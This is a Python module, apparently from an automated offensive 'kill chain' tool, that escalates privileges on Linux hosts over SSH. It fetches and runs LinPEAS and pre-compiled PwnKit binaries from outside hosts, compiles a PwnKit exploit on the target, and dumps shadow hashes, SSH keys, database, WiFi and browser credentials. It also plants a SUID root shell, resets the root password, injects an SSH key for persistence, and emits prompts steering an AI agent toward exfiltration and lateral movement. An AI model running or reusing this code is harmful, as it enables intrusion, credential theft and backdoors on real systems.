#!/usr/bin/env python3

import os
import re
import time
import socket
import shutil
import subprocess
import concurrent.futures

try:
    import paramiko
except ImportError:
    paramiko = None

try:
    from config import CFG, find_wordlist, find_all_wordlists
except ImportError:
    CFG = {}
    def find_wordlist(cat): return ""
    def find_all_wordlists(cat): return []

import logging
import secrets
import string

from core.killchain.exploits import get_privesc_exploits
from core.killchain.ssh_helpers import _ssh_connect, _ssh_exec
from core.killchain.exploitation import _PRIVESC_CHECKS, _EXPLOITABLE_SUIDS, _SUID_SKIP, _LINPEAS_URL

# Use unified colors
try:
    from core.colors import C
    C_GREEN, C_YELLOW, C_RED, C_CYAN = C.GREEN, C.YELLOW, C.RED, C.CYAN
    C_GREY, C_BLUE, C_MAGENTA, C_RESET = C.GRAY, C.BLUE, C.MAGENTA, C.RESET
except ImportError:
    C_GREEN  = "\033[92m"
    C_YELLOW = "\033[93m"
    C_RED    = "\033[91m"
    C_CYAN   = "\033[96m"
    C_GREY   = "\033[90m"
    C_BLUE   = "\033[94m"
    C_MAGENTA = "\033[95m"
    C_RESET  = "\033[0m"

logger = logging.getLogger("octopus.killchain.privesc")

# ── Configurable backdoor password (generated per-run for OPSEC) ──
# This is the password SET on targets during exploits like DirtyCow,
# writable /etc/shadow, etc. Randomized to avoid static IOCs.
def _gen_backdoor_pass() -> str:
    """Generate a random 12-char backdoor password."""
    alphabet = string.ascii_letters + string.digits + "!@#$"
    return "".join(secrets.choice(alphabet) for _ in range(12))

BACKDOOR_PASSWORD = CFG.get("killchain", {}).get("backdoor_password", _gen_backdoor_pass())
BACKDOOR_USER = "firefart"  # DirtyCow default username
BACKDOOR_SALT = "octopus"


# ═══════════════════════════════════════════════
# PARAMIKO SSH HELPERS (shared across stages)
# ═══════════════════════════════════════════════


def _run_linpeas(client, timeout: int = 180) -> tuple:
    """
    Download and execute LinPEAS on target. Returns (output_str, cve_list).
    CRITICAL: Output is redirected to a FILE on target, then read back.
    This prevents the paramiko stdout buffer deadlock that happens when
    LinPEAS produces 100KB+ of output.
    """
    print(f"    {C_CYAN}[*] Deploying LinPEAS...{C_RESET}")
    output = ""
    cves_found = []

    dl_path = "/dev/shm/.lp.sh"
    out_path = "/dev/shm/.lp.out"
    dl_ok = False

    # ── Download LinPEAS ─────────────────────────────────
    # Method 1: curl (most common)
    dl_result = _ssh_exec(client,
        f"curl -sLk --max-time 25 -o {dl_path} '{_LINPEAS_URL}' 2>&1 && echo DL_OK",
        timeout=30)
    if "DL_OK" in dl_result:
        dl_ok = True
        print(f"    {C_GREEN}[+] Downloaded via curl{C_RESET}")
    else:
        # Method 2: wget
        dl_result = _ssh_exec(client,
            f"wget -q --no-check-certificate -T 25 -O {dl_path} '{_LINPEAS_URL}' 2>&1 && echo DL_OK",
            timeout=30)
        if "DL_OK" in dl_result:
            dl_ok = True
            print(f"    {C_GREEN}[+] Downloaded via wget{C_RESET}")

    if not dl_ok:
        print(f"    {C_YELLOW}[!] LinPEAS download failed (no internet or no curl/wget){C_RESET}")
        output += "[!] LinPEAS download failed — skipping to manual checks.\n"
        return output, cves_found

    # Verify download is valid (should be > 10KB)
    size_check = _ssh_exec(client, f"wc -c < {dl_path} 2>/dev/null", timeout=5).strip()
    try:
        fsize = int(size_check)
        if fsize < 10000:
            print(f"    {C_YELLOW}[!] LinPEAS file too small ({fsize}B) — download may have failed{C_RESET}")
            _ssh_exec(client, f"rm -f {dl_path}", timeout=3)
            output += f"[!] LinPEAS download incomplete ({fsize}B) — skipping.\n"
            return output, cves_found
        print(f"    {C_GREEN}[+] LinPEAS size: {fsize}B{C_RESET}")
    except ValueError:
        pass  # wc not available, proceed anyway

    # ── Execute LinPEAS with output to FILE ──────────────
    # CRITICAL: We redirect to a file to avoid stdout buffer deadlock.
    # LinPEAS can produce 100KB+ which fills paramiko's channel buffer.
    _ssh_exec(client, f"chmod +x {dl_path}", timeout=5)
    print(f"    {C_CYAN}[*] Running LinPEAS (output → file, {timeout}s max)...{C_RESET}")

    # Run in background, poll for completion
    run_cmd = f"nohup bash {dl_path} -s -N -q > {out_path} 2>/dev/null & echo $!"
    pid_result = _ssh_exec(client, run_cmd, timeout=10).strip()

    # Extract PID
    pid = ""
    for line in pid_result.splitlines():
        line = line.strip()
        if line.isdigit():
            pid = line
            break

    if not pid:
        print(f"    {C_YELLOW}[!] Could not get LinPEAS PID — running inline{C_RESET}")
        # Fallback: run inline but with truncated output
        _ssh_exec(client,
            f"bash {dl_path} -s -N -q 2>/dev/null | head -500 > {out_path}",
            timeout=timeout)
    else:
        print(f"    {C_GREY}[*] LinPEAS PID: {pid}{C_RESET}")
        # Poll for completion every 5 seconds
        start = time.time()
        while time.time() - start < timeout:
            check = _ssh_exec(client, f"kill -0 {pid} 2>/dev/null && echo RUNNING || echo DONE", timeout=5)
            if "DONE" in check:
                elapsed = int(time.time() - start)
                print(f"    {C_GREEN}[+] LinPEAS finished in {elapsed}s{C_RESET}")
                break
            elapsed = int(time.time() - start)
            # Show progress
            out_size = _ssh_exec(client, f"wc -c < {out_path} 2>/dev/null", timeout=3).strip()
            print(f"    {C_GREY}[*] LinPEAS running... {elapsed}s ({out_size}B output){C_RESET}")
            time.sleep(5)
        else:
            # Timeout — kill LinPEAS
            print(f"    {C_YELLOW}[!] LinPEAS timeout ({timeout}s) — killing{C_RESET}")
            _ssh_exec(client, f"kill -9 {pid} 2>/dev/null; true", timeout=5)

    # ── Read output file back ────────────────────────────
    # Read in chunks to avoid buffer issues (max 50KB)
    lp_out = _ssh_exec(client,
        f"head -c 50000 {out_path} 2>/dev/null",
        timeout=15)

    # Cleanup
    _ssh_exec(client, f"rm -f {dl_path} {out_path} 2>/dev/null", timeout=5)

    if not lp_out or len(lp_out) < 50:
        print(f"    {C_YELLOW}[!] LinPEAS produced no output{C_RESET}")
        output += "[!] LinPEAS produced no useful output.\n"
        return output, cves_found

    print(f"    {C_GREEN}[+] LinPEAS output read ({len(lp_out)} bytes){C_RESET}")

    # ── Parse CVEs ───────────────────────────────────────
    for m in re.finditer(r'(CVE-\d{4}-\d{4,7})', lp_out):
        cve = m.group(1)
        if cve not in cves_found:
            cves_found.append(cve)

    if cves_found:
        print(f"    {C_RED}[!] LinPEAS CVEs: {', '.join(cves_found[:8])}{C_RESET}")
        output += f"[LinPEAS CVEs] {', '.join(cves_found)}\n"

    # ── Extract key findings ─────────────────────────────
    _KEY_MARKERS = [
        "Vulnerable to", "99% a]", "95% a]",
        "SUID", "Sudo", "Capabilities", "writable",
        "password", "Cron", "Unknown SUID",
        "CVE-", "/bin/bash", "NOPASSWD",
        "docker", "lxc", "lxd",
    ]
    important_lines = []
    for line in lp_out.splitlines():
        lc = line.strip()
        if not lc or len(lc) < 3:
            continue
        if any(kw.lower() in lc.lower() for kw in _KEY_MARKERS):
            important_lines.append(lc)

    filtered = "\n".join(important_lines)
    if len(filtered) > 3000:
        filtered = filtered[:3000] + "\n... [TRUNCATED]"

    output += f"\n[LinPEAS KEY FINDINGS]\n{filtered}\n"
    return output, cves_found


def _harvest_credentials(client, host: str) -> str:
    """Post-exploitation credential harvesting (v8.0).
    Called after successful privilege escalation."""
    output = f"\n{'=' * 50}\n[CREDENTIAL HARVEST -- {host}]\n{'=' * 50}\n"
    print(f"\n    {C_GREEN}[*] Harvesting credentials...{C_RESET}")
    started = time.time()
    max_seconds = int(CFG.get("killchain", {}).get("credential_harvest_timeout", 45))
    auto_crack = bool(CFG.get("killchain", {}).get("auto_crack_after_privesc", False))

    def budget_left() -> bool:
        return (time.time() - started) < max_seconds

    # 1. Shadow dump for local cracking
    shadow_dump = _ssh_exec(client, "cat /etc/shadow 2>/dev/null", timeout=10)
    if not shadow_dump or "$" not in shadow_dump:
        shadow_dump = _ssh_exec(client, "sudo -n cat /etc/shadow 2>/dev/null", timeout=10)

    if shadow_dump and "$" in shadow_dump:
        shadow_file = f"/tmp/octopus_shadow_{host.replace('.','_')}.txt"
        try:
            with open(shadow_file, "w") as sf:
                sf.write(shadow_dump)
            output += f"\n[SHADOW DUMP -> {shadow_file}]\n{shadow_dump[:3000]}\n"
            print(f"    {C_GREEN}[+] Shadow saved to {shadow_file}{C_RESET}")

            if auto_crack and budget_left():
                try:
                    from hash_cracker import HashCracker
                    hc = HashCracker()
                    hc.timeout = min(getattr(hc, "timeout", 600), max(20, max_seconds - int(time.time() - started)))
                    crack_result = hc.smart_crack(shadow_dump)
                    output += f"\n{crack_result}\n"
                    for cracked_user, cracked_pwd in hc.get_cracked_pairs():
                        try:
                            from tools import register_credential
                            register_credential("ssh", host, cracked_user, cracked_pwd)
                        except ImportError:
                            pass
                    hc.cleanup()
                except ImportError:
                    output += f"\nAI: Shadow hashes extracted. Use [TOOL: crack_hashes {shadow_file}] for local GPU cracking.\n"
            else:
                output += f"\nAI: Shadow hashes extracted. Use [TOOL: crack_hashes {shadow_file}] for local GPU cracking.\n"
        except Exception as e:
            output += f"\n[!] Failed to save shadow: {e}\n"

    # 2. SSH private keys
    if not budget_left():
        output += f"\n[!] Credential harvest budget reached ({max_seconds}s); skipped remaining checks.\n"
        return output
    ssh_keys = _ssh_exec(client,
        "find /root /home -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' 2>/dev/null",
        timeout=10)
    if ssh_keys.strip():
        output += f"\n[SSH PRIVATE KEYS]\n"
        for key_path in ssh_keys.strip().splitlines()[:5]:
            key_path = key_path.strip()
            if key_path:
                key_content = _ssh_exec(client, f"cat '{key_path}' 2>/dev/null", timeout=5)
                if key_content and "PRIVATE KEY" in key_content:
                    output += f"  {key_path}:\n{key_content[:500]}\n"
                    print(f"    {C_GREEN}[+] SSH key: {key_path}{C_RESET}")

    # 3. Database credentials
    if not budget_left():
        output += f"\n[!] Credential harvest budget reached ({max_seconds}s); skipped remaining checks.\n"
        return output
    db_creds = _ssh_exec(client,
        "grep -rn 'password\\|passwd\\|db_pass\\|DB_PASS' "
        "/etc/mysql/ /etc/postgresql/ /var/www/ /opt/ "
        "2>/dev/null | grep -v Binary | head -20",
        timeout=15)
    if db_creds.strip():
        output += f"\n[DATABASE CREDENTIALS]\n{db_creds[:2000]}\n"
        print(f"    {C_GREEN}[+] DB credentials found{C_RESET}")

    # 4. WiFi passwords
    if not budget_left():
        output += f"\n[!] Credential harvest budget reached ({max_seconds}s); skipped remaining checks.\n"
        return output
    wifi = _ssh_exec(client,
        "find /etc/NetworkManager -name '*.nmconnection' "
        "-exec grep -l psk {} \\; 2>/dev/null",
        timeout=5)
    if wifi.strip():
        for wf in wifi.strip().splitlines()[:3]:
            wf = wf.strip()
            wifi_content = _ssh_exec(client, f"cat '{wf}' 2>/dev/null", timeout=5)
            if wifi_content:
                output += f"\n[WIFI CONFIG: {wf}]\n{wifi_content}\n"

    # 5. Browser credentials / history
    if not budget_left():
        output += f"\n[!] Credential harvest budget reached ({max_seconds}s); skipped remaining checks.\n"
        return output
    browser_files = _ssh_exec(client,
        "find /root /home -name 'Login Data' -o -name 'key4.db' -o -name 'logins.json' "
        "2>/dev/null | head -5",
        timeout=10)
    if browser_files.strip():
        output += f"\n[BROWSER CREDENTIAL FILES]\n"
        for bf in browser_files.strip().splitlines():
            output += f"  {bf.strip()}\n"
        output += "  AI: Extract with [CMD: python3 -c 'from lazagne.all import *; computer_password(print)'] or manual DPAPI.\n"

    # 6. Kerberos tickets
    if not budget_left():
        output += f"\n[!] Credential harvest budget reached ({max_seconds}s); skipped remaining checks.\n"
        return output
    krb = _ssh_exec(client, "find /tmp -name 'krb5cc_*' 2>/dev/null", timeout=5)
    if krb.strip():
        output += f"\n[KERBEROS TICKETS]\n{krb}\n"
        output += "  AI: Use tickets for lateral movement.\n"

    return output


def run_privesc(host: str, user: str, password: str, port: int = 22) -> str:
    """
    Automated privilege escalation via paramiko.
    Phase 1: LinPEAS scan for comprehensive enumeration
    Phase 2: Manual SUID/sudo/docker/writable checks
    Phase 3: Auto-exploit found vectors (PwnKit, DirtyCow, etc.)
    """
    print(f"\n  {C_RED}[KILL CHAIN] Stage 3: Privilege Escalation — {user}@{host}{C_RESET}")
    output = f"[KILL CHAIN — PRIVILEGE ESCALATION — {user}@{host}:{port}]\n{'═' * 60}\n\n"

    client, err = _ssh_connect(host, user, password, port)
    if err:
        return output + f"[!] SSH connection failed: {err}\n"

    try:
        # Check current privilege level
        whoami = _ssh_exec(client, "id")
        output += f"Current: {whoami}\n\n"
        is_already_root = "uid=0" in whoami

        if is_already_root:
            output += "[+] ALREADY ROOT — no privesc needed.\n"
            output += "AI: We have root. Proceed to persistence and data exfil.\n"
            return output

        # ── PHASE 1: LinPEAS ─────────────────────────────────────
        print(f"\n    {C_CYAN}[PHASE 1] Running LinPEAS for comprehensive enumeration...{C_RESET}")
        linpeas_output, linpeas_cves = _run_linpeas(client, timeout=120)
        output += linpeas_output

        # ── PHASE 2: Manual privesc checks ───────────────────────
        print(f"\n    {C_CYAN}[PHASE 2] Manual privesc checks...{C_RESET}")
        # Run all privesc checks
        privesc_vectors = []
        for label, cmd in _PRIVESC_CHECKS:
            print(f"    {C_GREY}[→] {label}...{C_RESET}", end="", flush=True)
            result = _ssh_exec(client, cmd, timeout=15)

            if result and "[!]" not in result:
                output += f"[{label}]\n{result[:1500]}\n\n"

                # Analyze SUID binaries — use BASENAME matching (not substring)
                if label == "SUID binaries" and result:
                    found_exploitable = False
                    for suid_path in result.strip().splitlines():
                        suid_path = suid_path.strip()
                        if not suid_path:
                            continue
                        basename = os.path.basename(suid_path)
                        if basename in _SUID_SKIP:
                            continue  # known non-exploitable
                        if basename in _EXPLOITABLE_SUIDS:
                            privesc_vectors.append({
                                "type": "SUID",
                                "binary": basename,
                                "path": suid_path,
                                "exploit": _EXPLOITABLE_SUIDS[basename]
                            })
                            found_exploitable = True
                    if found_exploitable:
                        print(f" {C_RED}← EXPLOITABLE SUID!{C_RESET}")
                        # Show only the ACTUALLY exploitable binaries
                        for vec in privesc_vectors:
                            if vec['type'] == 'SUID':
                                print(f"      {C_RED}  {vec.get('path', vec['binary'])}{C_RESET}")
                    else:
                        print(f" {C_GREEN}✓{C_RESET}")

                # Analyze sudo
                elif label == "Sudo permissions" and "NOPASSWD" in result:
                    # Extract NOPASSWD commands
                    for line in result.splitlines():
                        if "NOPASSWD" in line:
                            privesc_vectors.append({
                                "type": "SUDO_NOPASSWD",
                                "binary": line.strip(),
                                "exploit": f"sudo {line.split()[-1]} (run as root)"
                            })
                            print(f" {C_RED}← SUDO PRIVESC: {line.strip()[:80]}{C_RESET}")

                # Docker group
                elif label == "Docker group" and "docker" in result.lower():
                    privesc_vectors.append({
                        "type": "DOCKER",
                        "binary": "docker",
                        "exploit": "docker run -v /:/mnt --rm -it alpine chroot /mnt bash"
                    })
                    print(f" {C_RED}← DOCKER PRIVESC!{C_RESET}")

                # LXD
                elif label == "LXD group" and "lxd" in result.lower():
                    privesc_vectors.append({
                        "type": "LXD",
                        "binary": "lxd",
                        "exploit": "lxc init alpine privesc -c security.privileged=true"
                    })
                    print(f" {C_RED}← LXD PRIVESC!{C_RESET}")

                # Writable passwd
                elif label == "Writable /etc/passwd":
                    try:
                        perms = result.split()[0]  # e.g. -rw-rw-rw-
                        if len(perms) >= 8 and (perms[5] == 'w' or perms[8] == 'w'):
                            privesc_vectors.append({
                                "type": "WRITABLE_PASSWD",
                                "binary": "/etc/passwd",
                                "exploit": "echo 'hacker:$(openssl passwd -1 pass123):0:0::/root:/bin/bash' >> /etc/passwd"
                            })
                            print(f" {C_RED}← WRITABLE PASSWD!{C_RESET}")
                        else:
                            print(f" {C_GREEN}✓{C_RESET}")
                    except (IndexError, TypeError):
                        print(f" {C_GREEN}✓{C_RESET}")

                # Writable shadow — NEW: auto-exploit by replacing root hash
                elif label == "Writable /etc/shadow":
                    try:
                        perms = result.split()[0]
                        if len(perms) >= 8 and (perms[5] == 'w' or perms[8] == 'w'):
                            privesc_vectors.append({
                                "type": "WRITABLE_SHADOW",
                                "binary": "/etc/shadow",
                                "exploit": "replace root hash in /etc/shadow"
                            })
                            print(f" {C_RED}← WRITABLE SHADOW!{C_RESET}")
                        else:
                            print(f" {C_GREEN}✓{C_RESET}")
                    except (IndexError, TypeError):
                        print(f" {C_GREEN}✓{C_RESET}")

                else:
                    print(f" {C_GREEN}✓{C_RESET}")
                    # v4.2: Show actual data for important checks (not just ✓)
                    _SHOW_DATA_LABELS = {
                        "Backup files", "Config files with passwords",
                        "SSH private keys", "Interesting configs",
                        "Internal listeners", "Crontab",
                        "Writable scripts in PATH", "Kernel info",
                    }
                    if label in _SHOW_DATA_LABELS and result.strip():
                        for line in result.strip().splitlines()[:5]:
                            line_clean = line.strip()
                            if line_clean:
                                print(f"      {C_CYAN}  {line_clean[:120]}{C_RESET}")
                        if len(result.strip().splitlines()) > 5:
                            print(f"      {C_GREY}  ... ({len(result.strip().splitlines())-5} more lines){C_RESET}")
            else:
                print(f" {C_GREY}—{C_RESET}")

        # ── ATTEMPT PRIVESC ──────────────────────────────────────
        output += f"\n{'═' * 60}\n"
        got_root = False

        if privesc_vectors:
            output += f"\n[!] PRIVILEGE ESCALATION VECTORS FOUND: {len(privesc_vectors)}\n"
            for vec in privesc_vectors:
                output += f"  [{vec['type']}] {vec['binary']} → {vec['exploit']}\n"

            # v6.0: Try ALL vectors (not just the first), and capture PROOF
            for vec in privesc_vectors:
                if got_root:
                    break

                vtype = vec["type"]
                vbin = vec["binary"]
                vexploit = vec["exploit"]

                print(f"\n  {C_RED}[*] Attempting privesc via {vtype}: {vbin}{C_RESET}")

                if vtype == "SUDO_NOPASSWD":
                    # Try sudo -i, show actual output
                    id_result = _ssh_exec(client, "sudo -n id 2>&1", timeout=10)
                    output += f"\n[PRIVESC ATTEMPT: SUDO_NOPASSWD]\n"
                    output += f"  [PROOF] sudo -n id → {id_result.strip()}\n"
                    print(f"    {C_CYAN}[PROOF] sudo -n id → {id_result.strip()[:80]}{C_RESET}")

                    if "uid=0" in id_result:
                        got_root = True
                        output += f"  [+] PRIVESC SUCCESSFUL via sudo! uid=0 CONFIRMED.\n"
                        print(f"    {C_GREEN}[+] ROOT CONFIRMED via sudo!{C_RESET}")
                        # Dump proof artifacts
                        shadow = _ssh_exec(client, "sudo cat /etc/shadow 2>/dev/null", timeout=10)
                        if shadow and "$" in shadow:
                            output += f"\n[PROOF: /etc/shadow]\n{shadow[:2000]}\n"
                            print(f"    {C_GREEN}[+] Shadow file dumped as proof{C_RESET}")
                        whoami = _ssh_exec(client, "sudo whoami 2>/dev/null", timeout=5)
                        output += f"  [PROOF] whoami → {whoami.strip()}\n"
                    else:
                        output += f"  [-] sudo did not yield root. Output: {id_result.strip()[:200]}\n"

                elif vtype == "SUID":
                    output += f"\n[PRIVESC ATTEMPT: SUID — {vbin}]\n"

                    # v6.0: Use correct exploit syntax per binary
                    if vbin == "bash":
                        # bash -p preserves euid from SUID
                        id_result = _ssh_exec(client, "bash -p -c 'id' 2>&1", timeout=10)
                        output += f"  [PROOF] bash -p -c 'id' → {id_result.strip()}\n"
                        print(f"    {C_CYAN}[PROOF] bash -p → {id_result.strip()[:80]}{C_RESET}")
                        if "uid=0" in id_result or "euid=0" in id_result:
                            got_root = True
                            output += f"  [+] SUID BASH PRIVESC SUCCESSFUL!\n"
                            shadow = _ssh_exec(client, "bash -p -c 'cat /etc/shadow' 2>/dev/null", timeout=10)
                            if shadow and "$" in shadow:
                                output += f"\n[PROOF: /etc/shadow via bash -p]\n{shadow[:2000]}\n"

                    elif vbin == "pkexec":
                        # CVE-2021-4034 (PwnKit) — auto-deploy exploit
                        pkexec_ver = _ssh_exec(client, "pkexec --version 2>&1", timeout=5)
                        output += f"  pkexec version: {pkexec_ver.strip()}\n"
                        print(f"    {C_CYAN}[*] Deploying CVE-2021-4034 PwnKit exploit...{C_RESET}")

                        has_gcc = "gcc" in _ssh_exec(client, "which gcc cc 2>/dev/null", timeout=5)
                        pwnkit_ok = False

                        if has_gcc:
                            # Deploy C-based PwnKit exploit
                            pwnkit_c = r'''
#include <stdio.h>
#include <stdlib.h>
void gconv() {}
void gconv_init() {
    setuid(0); setgid(0);
    seteuid(0); setegid(0);
    system("mkdir -p /tmp/.mtr && cp /bin/bash /tmp/.mtr/rootbash && chmod +s /tmp/.mtr/rootbash");
    system("/tmp/.mtr/rootbash -p -c 'id > /tmp/.mtr/proof.txt'");
}
'''
                            gconv_modules = "module  UTF-8//    INTERNAL    ../pwnkit    2"
                            deploy_cmds = [
                                "mkdir -p /tmp/.mtr/GCONV_PATH=. && cd /tmp/.mtr",
                                f"echo '{pwnkit_c}' > /tmp/.mtr/pwnkit.c",
                                "gcc -o /tmp/.mtr/pwnkit.so -shared -fPIC /tmp/.mtr/pwnkit.c 2>/dev/null",
                                f"echo '{gconv_modules}' > /tmp/.mtr/gconv-modules",
                                "mkdir -p /tmp/.mtr/GCONV_PATH=.",
                                "chmod 777 /tmp/.mtr/GCONV_PATH=.",
                                "GCONV_PATH=/tmp/.mtr CHARSET=UTF-8 SHELL=bash pkexec --help 2>/dev/null; true",
                            ]
                            for deploy_cmd in deploy_cmds:
                                _ssh_exec(client, deploy_cmd, timeout=10)

                            check = _ssh_exec(client, "ls -la /tmp/.mtr/rootbash 2>/dev/null && /tmp/.mtr/rootbash -p -c 'id' 2>&1", timeout=10)
                            output += f"  [PROOF] PwnKit result: {check.strip()[:200]}\n"
                            if "uid=0" in check or "euid=0" in check:
                                pwnkit_ok = True
                                got_root = True
                                output += f"  [+] PWNKIT CVE-2021-4034 PRIVESC SUCCESSFUL!\n"
                                print(f"    {C_GREEN}[+] ROOT via PwnKit (gcc)!{C_RESET}")
                                shadow = _ssh_exec(client, "/tmp/.mtr/rootbash -p -c 'cat /etc/shadow' 2>/dev/null", timeout=10)
                                if shadow and "$" in shadow:
                                    output += f"\n[PROOF: /etc/shadow via PwnKit]\n{shadow[:2000]}\n"

                        if not pwnkit_ok:
                            # v8.0: Download pre-compiled PwnKit binary (no gcc needed!)
                            print(f"    {C_CYAN}[*] Downloading pre-compiled PwnKit binary...{C_RESET}")
                            _PWNKIT_URLS = [
                                "https://github.com/ly4k/PwnKit/raw/main/PwnKit",
                                "https://github.com/berdav/CVE-2021-4034/raw/main/cve-2021-4034",
                            ]
                            pk_path = "/tmp/.mtr/pk"
                            _ssh_exec(client, "mkdir -p /tmp/.mtr", timeout=5)
                            pk_downloaded = False

                            for pk_url in _PWNKIT_URLS:
                                dl = _ssh_exec(client,
                                    f"curl -sLk --max-time 20 -o {pk_path} '{pk_url}' 2>&1 && echo DL_OK",
                                    timeout=25)
                                if "DL_OK" in dl:
                                    # Verify it's a real binary (> 1KB)
                                    sz = _ssh_exec(client, f"wc -c < {pk_path} 2>/dev/null", timeout=5).strip()
                                    try:
                                        if int(sz) > 1000:
                                            pk_downloaded = True
                                            print(f"    {C_GREEN}[+] PwnKit binary downloaded ({sz}B){C_RESET}")
                                            break
                                    except ValueError:
                                        pass
                                # Try wget fallback
                                dl = _ssh_exec(client,
                                    f"wget -q --no-check-certificate -T 20 -O {pk_path} '{pk_url}' 2>&1 && echo DL_OK",
                                    timeout=25)
                                if "DL_OK" in dl:
                                    sz = _ssh_exec(client, f"wc -c < {pk_path} 2>/dev/null", timeout=5).strip()
                                    try:
                                        if int(sz) > 1000:
                                            pk_downloaded = True
                                            print(f"    {C_GREEN}[+] PwnKit binary downloaded ({sz}B){C_RESET}")
                                            break
                                    except ValueError:
                                        pass

                            if pk_downloaded:
                                _ssh_exec(client, f"chmod +x {pk_path}", timeout=5)

                                # v8.1: PwnKit binary creates SUID rootbash first
                                # Step 1: Create SUID bash via PwnKit
                                _ssh_exec(client,
                                    f"{pk_path} 'cp /bin/bash /tmp/.mtr/rootbash && chmod 4755 /tmp/.mtr/rootbash' 2>/dev/null",
                                    timeout=15)
                                # Also try running directly (some PwnKit variants)
                                pk_result = _ssh_exec(client,
                                    f"{pk_path} id 2>&1 || {pk_path} 2>&1 | head -10",
                                    timeout=15)
                                output += f"  [*] PwnKit binary result: {pk_result.strip()[:300]}\n"
                                print(f"    {C_CYAN}[*] PwnKit binary output: {pk_result.strip()[:100]}{C_RESET}")

                                # Step 2: Check if rootbash was created with SUID
                                rootbash_check = _ssh_exec(client,
                                    "ls -la /tmp/.mtr/rootbash 2>/dev/null && /tmp/.mtr/rootbash -p -c 'id' 2>&1",
                                    timeout=10)
                                has_rootbash = "uid=0" in rootbash_check or "euid=0" in rootbash_check

                                if "uid=0" in pk_result or "euid=0" in pk_result or "root" in pk_result or has_rootbash:
                                    got_root = True
                                    pwnkit_ok = True
                                    output += f"  [+] PWNKIT BINARY PRIVESC SUCCESSFUL!\n"
                                    print(f"    {C_GREEN}[+] ROOT via pre-compiled PwnKit!{C_RESET}")

                                    # Determine the root shell command
                                    if has_rootbash:
                                        root_cmd = "/tmp/.mtr/rootbash -p -c"
                                    else:
                                        root_cmd = f"{pk_path}"

                                    # Step 3: Extract /etc/shadow
                                    shadow = _ssh_exec(client,
                                        f"{root_cmd} 'cat /etc/shadow' 2>/dev/null",
                                        timeout=15)
                                    if shadow and "root:" in shadow:
                                        print(f"    {C_GREEN}[+] Extracted /etc/shadow ({len(shadow)} bytes){C_RESET}")
                                        output += f"\n[PROOF: /etc/shadow via PwnKit]\n{shadow[:2000]}\n"

                                        # v8.1: Save shadow to loot
                                        loot_dir = os.path.expanduser(f"~/OCTOPUS/loot/{host.replace('.','_')}")
                                        os.makedirs(loot_dir, exist_ok=True)
                                        shadow_path = os.path.join(loot_dir, "shadow")
                                        try:
                                            with open(shadow_path, "w") as sf:
                                                sf.write(shadow)
                                            output += f"  [+] Shadow saved to: {shadow_path}\n"
                                        except Exception as _exc:
                                            logging.debug(f"Suppressed in privesc.py: {_exc}")

                                    # Step 4: Try chpasswd (may or may not work)
                                    chpasswd_result = _ssh_exec(client,
                                        f"{root_cmd} 'echo root:octopus | chpasswd 2>&1 && echo CHPASSWD_OK'",
                                        timeout=15)

                                    if "CHPASSWD_OK" in chpasswd_result:
                                        # Verify by trying SSH as root
                                        # paramiko is imported at module level (line 16)
                                        test_client = paramiko.SSHClient()
                                        test_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                                        pw_changed = False
                                        try:
                                            test_client.connect(host, port=port, username="root",
                                                              password="octopus", timeout=10,
                                                              allow_agent=False, look_for_keys=False)
                                            test_client.close()
                                            pw_changed = True
                                        except Exception as _exc:
                                            logging.debug(f"Suppressed in privesc.py: {_exc}")

                                        if pw_changed:
                                            print(f"    {C_GREEN}[+] Root password changed to 'octopus' — VERIFIED{C_RESET}")
                                            output += "\n[+] Root password changed to 'octopus' — SSH verified!\n"
                                            try:
                                                from tools import register_credential
                                                register_credential("ssh", host, "root", "octopus")
                                            except ImportError:
                                                pass
                                        else:
                                            print(f"    {C_YELLOW}[!] chpasswd reported OK but SSH login failed — trying SSH key{C_RESET}")
                                            output += "\n[!] chpasswd output OK but SSH verify failed.\n"
                                    else:
                                        print(f"    {C_YELLOW}[!] chpasswd failed — injecting SSH key instead{C_RESET}")
                                        output += "\n[!] Password change failed.\n"

                                    # Step 5: ALWAYS inject SSH key as root (backup access method)
                                    import subprocess
                                    local_key_path = os.path.expanduser("~/.ssh/id_rsa.pub")
                                    if not os.path.isfile(local_key_path):
                                        # Generate key if missing
                                        subprocess.run(
                                            ["ssh-keygen", "-t", "rsa", "-b", "2048",
                                             "-f", os.path.expanduser("~/.ssh/id_rsa"),
                                             "-N", ""],
                                            capture_output=True, timeout=15
                                        )
                                    if os.path.isfile(local_key_path):
                                        with open(local_key_path, "r") as kf:
                                            pub_key = kf.read().strip()
                                        _ssh_exec(client,
                                            f"{root_cmd} 'mkdir -p /root/.ssh && chmod 700 /root/.ssh && "
                                            f"echo \"{pub_key}\" >> /root/.ssh/authorized_keys && "
                                            f"chmod 600 /root/.ssh/authorized_keys'",
                                            timeout=15)
                                        # Verify key auth
                                        test2 = paramiko.SSHClient()
                                        test2.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                                        key_ok = False
                                        try:
                                            priv_key = paramiko.RSAKey.from_private_key_file(
                                                os.path.expanduser("~/.ssh/id_rsa"))
                                            test2.connect(host, port=port, username="root",
                                                         pkey=priv_key, timeout=10,
                                                         allow_agent=False, look_for_keys=False)
                                            test2.close()
                                            key_ok = True
                                        except Exception as _exc:
                                            logging.debug(f"Suppressed in privesc.py: {_exc}")

                                        if key_ok:
                                            print(f"    {C_GREEN}[+] SSH key injected for root — VERIFIED{C_RESET}")
                                            output += "[+] SSH key injected for root — key auth verified!\n"
                                            # Register key-based root access
                                            try:
                                                from tools import register_credential
                                                register_credential("ssh", host, "root", "__KEY_AUTH__")
                                            except ImportError:
                                                pass
                                        else:
                                            print(f"    {C_YELLOW}[!] SSH key injection done but verify failed (sshd config?){C_RESET}")
                                            output += "[!] SSH key injection: key placed but auth failed.\n"

                                    output += "\n  [+] \u2713 ROOT ACCESS CONFIRMED\n"

                                else:
                                    output += f"  [-] Pre-compiled PwnKit did not yield root.\n"
                                    print(f"    {C_YELLOW}[-] PwnKit binary did not give root{C_RESET}")
                            else:
                                output += f"  [!] Could not download pre-compiled PwnKit (no internet?).\n"
                                print(f"    {C_YELLOW}[!] PwnKit binary download failed{C_RESET}")

                            # Cleanup PwnKit (keep rootbash if created)
                            _ssh_exec(client, f"killall -9 PwnKit 2>/dev/null; rm -f {pk_path} 2>/dev/null", timeout=5)

                    elif vbin == "find":
                        id_result = _ssh_exec(client, "find /dev/null -exec id \\; 2>&1", timeout=10)
                        output += f"  [PROOF] find -exec id → {id_result.strip()}\n"
                        print(f"    {C_CYAN}[PROOF] find -exec → {id_result.strip()[:80]}{C_RESET}")
                        if "uid=0" in id_result or "euid=0" in id_result:
                            got_root = True
